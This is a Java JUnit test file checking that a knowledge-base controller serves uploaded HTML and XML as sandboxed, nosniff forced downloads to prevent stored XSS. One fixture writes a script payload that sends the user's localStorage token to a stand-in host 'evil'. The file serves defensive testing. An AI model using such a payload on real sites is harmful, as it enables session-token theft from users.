package com.agent.rag.controller;

import com.agent.rag.entity.KnowledgeDoc;
import com.agent.rag.service.KnowledgeService;
import com.agent.rag.storage.FileStorageService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.test.util.ReflectionTestUtils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyLong;
import static org.mockito.Mockito.when;

/**
 * 文档文件响应安全头单测（防存储型 XSS）：
 * 可执行脚本的危险文本类型（html/xml/svg）即使请求 inline 预览，也必须强制下载 + nosniff + CSP sandbox，
 * 杜绝用户上传的 HTML 在同源下被当活动页面执行窃取 JWT；安全类型（pdf/txt/md）保持原有 inline 预览。
 *
 * @author pulinsenz
 */
@ExtendWith(MockitoExtension.class)
class KnowledgeControllerFileServingTest {

    @Mock
    private KnowledgeService knowledgeService;
    @Mock
    private FileStorageService fileStorageService;

    private KnowledgeController controller;

    @TempDir
    Path tempDir;

    @BeforeEach
    void setUp() {
        controller = new KnowledgeController();
        ReflectionTestUtils.setField(controller, "knowledgeService", knowledgeService);
        ReflectionTestUtils.setField(controller, "fileStorageService", fileStorageService);
    }

    private KnowledgeDoc doc(String name, Path file) {
        KnowledgeDoc doc = new KnowledgeDoc();
        doc.setId(1L);
        doc.setKnowledgeId(2L);
        doc.setName(name);
        doc.setFileUrl(file.toAbsolutePath().toString());
        return doc;
    }

    @Test
    void docFile_htmlForcesAttachmentAndNoSniff() throws IOException {
        // html 文档：请求 inline 预览也必须强制下载 + nosniff + CSP，杜绝同源执行脚本窃取 token
        Path html = tempDir.resolve("evil.html");
        Files.writeString(html, "<script>document.location='https://evil/?c='+localStorage.getItem('token')</script>");
        when(knowledgeService.getViewableDoc(anyLong(), anyLong())).thenReturn(doc("evil.html", html));

        ResponseEntity<Resource> resp = controller.docFile(2L, 1L);

        assertEquals("text/html", resp.getHeaders().getContentType().toString());
        assertTrue(resp.getHeaders().getFirst(HttpHeaders.CONTENT_DISPOSITION).startsWith("attachment"),
                "html 必须强制下载而非 inline 渲染");
        assertEquals("nosniff", resp.getHeaders().getFirst("X-Content-Type-Options"));
        assertEquals("sandbox; default-src 'none'", resp.getHeaders().getFirst("Content-Security-Policy"));
    }

    @Test
    void docFile_xmlForcesAttachment() throws IOException {
        // XML 可内嵌 XSLT/脚本，与 html 同策略强制下载
        Path xml = tempDir.resolve("doc.xml");
        Files.writeString(xml, "<?xml version=\"1.0\"?><doc>data</doc>");
        when(knowledgeService.getViewableDoc(anyLong(), anyLong())).thenReturn(doc("doc.xml", xml));

        ResponseEntity<Resource> resp = controller.docFile(2L, 1L);

        assertTrue(resp.getHeaders().getFirst(HttpHeaders.CONTENT_DISPOSITION).startsWith("attachment"),
                "xml 必须强制下载");
        assertEquals("sandbox; default-src 'none'", resp.getHeaders().getFirst("Content-Security-Policy"));
    }

    @Test
    void docFile_pdfKeepsInlinePreview() throws IOException {
        // 安全类型（pdf 等）保持 inline 预览，仅加 nosniff，不影响原有功能
        Path pdf = tempDir.resolve("guide.pdf");
        Files.writeString(pdf, "%PDF-1.4 fake");
        when(knowledgeService.getViewableDoc(anyLong(), anyLong())).thenReturn(doc("guide.pdf", pdf));

        ResponseEntity<Resource> resp = controller.docFile(2L, 1L);

        assertTrue(resp.getHeaders().getFirst(HttpHeaders.CONTENT_DISPOSITION).startsWith("inline"),
                "pdf 应保持 inline 预览");
        assertEquals("nosniff", resp.getHeaders().getFirst("X-Content-Type-Options"));
    }

    @Test
    void download_htmlAlwaysAttachment() throws IOException {
        // 下载接口本就 attachment；危险类型额外叠加 CSP 兜底
        Path html = tempDir.resolve("evil.html");
        Files.writeString(html, "<script>1</script>");
        when(knowledgeService.getViewableDoc(anyLong(), anyLong())).thenReturn(doc("evil.html", html));

        ResponseEntity<Resource> resp = controller.docDownload(2L, 1L);

        assertTrue(resp.getHeaders().getFirst(HttpHeaders.CONTENT_DISPOSITION).startsWith("attachment"));
        assertEquals("sandbox; default-src 'none'", resp.getHeaders().getFirst("Content-Security-Policy"));
    }
}
